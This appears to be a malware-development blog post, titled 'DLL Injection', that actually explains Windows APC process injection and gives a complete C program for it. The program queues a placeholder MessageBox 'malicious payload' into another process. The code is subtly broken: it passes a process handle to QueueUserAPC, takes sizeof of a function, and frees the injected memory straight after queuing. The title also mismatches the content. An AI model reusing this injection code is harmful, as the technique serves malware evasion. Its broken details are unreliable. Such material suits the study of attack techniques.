---
layout: single
title: "Payload Unleashed: DLL Injection"
date: 2024-03-01
classes: wide
header:
  teaser: /assets/images/maldev.png
categories:
  - infosec
tags:
  - windows
  - malware
  - payload-unleashed
---
### Understanding the APC Injection Process

Before delving into the code snippet, let's understand the purpose of each function used in the APC injection process and its significance within the attack:

1. **OpenProcess()**: This function is used to open a handle to the target process identified by its process ID (`<TARGET_PROCESS_ID>`). By opening the target process, we gain the necessary access rights to perform operations such as memory allocation and writing.

2. **VirtualAllocEx()**: Once the target process is opened, this function is employed to allocate memory within the target process's address space. This allocated memory will be used to store the malicious payload, enabling its execution within the context of the target process.

3. **WriteProcessMemory()**: With memory allocated within the target process, this function is utilized to write the malicious payload (in this case, the `MaliciousCode` function) into the allocated memory space. By writing the payload into the target process's memory, we prepare for its execution within the context of the process.

4. **QueueUserAPC()**: This function is central to the APC injection technique. It queues an Asynchronous Procedure Call (APC) to the target process, specifying the address of the malicious payload to be executed. When the target process enters an alertable state, typically during certain system calls or when waiting for I/O operations, the queued APC is scheduled for execution.

5. **Malicious Payload Execution**: Upon entering an alertable state, the queued APC is executed within the target process. As a result, the address of the malicious payload is invoked, leading to the execution of the malicious code within the context of the legitimate process.

### Hands-On: APC Injection with C Code Snippet

Now, let's dive into the provided C code snippet, which demonstrates the APC injection process:

```c
#include <windows.h>
#include <stdio.h>

// Function pointer for the malicious payload
typedef VOID (*MALICIOUS_PAYLOAD)();

// Malicious payload to be executed
VOID MaliciousCode()
{
    MessageBoxA(NULL, "Malicious payload executed!", "APC Injection", MB_OK | MB_ICONWARNING);
}

int main()
{
    // Open the target process for injection
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <TARGET_PROCESS_ID>); // Replace <TARGET_PROCESS_ID> with the process ID of the target process

    if (hProcess == NULL)
    {
        printf("Failed to open target process. Error code: %d\n", GetLastError());
        return 1;
    }

    // Allocate memory within the target process for the malicious payload
    LPVOID pPayloadAddress = VirtualAllocEx(hProcess, NULL, sizeof(MaliciousCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pPayloadAddress == NULL)
    {
        printf("Failed to allocate memory in target process. Error code: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the malicious payload to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, pPayloadAddress, &MaliciousCode, sizeof(MaliciousCode), NULL))
    {
        printf("Failed to write malicious payload to target process. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pPayloadAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Queue the APC to the target process
    if (!QueueUserAPC((PAPCFUNC)pPayloadAddress, hProcess, NULL))
    {
        printf("Failed to queue APC to target process. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pPayloadAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("APC injected successfully!\n");

    // Clean up
    VirtualFreeEx(hProcess, pPayloadAddress, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
```

This code snippet encapsulates the entire process of APC injection, from opening the target process to executing the malicious payload within its context. Each function plays a critical role in orchestrating this sophisticated attack, underscoring the stealthy nature of APC injection techniques in bypassing traditional security measures.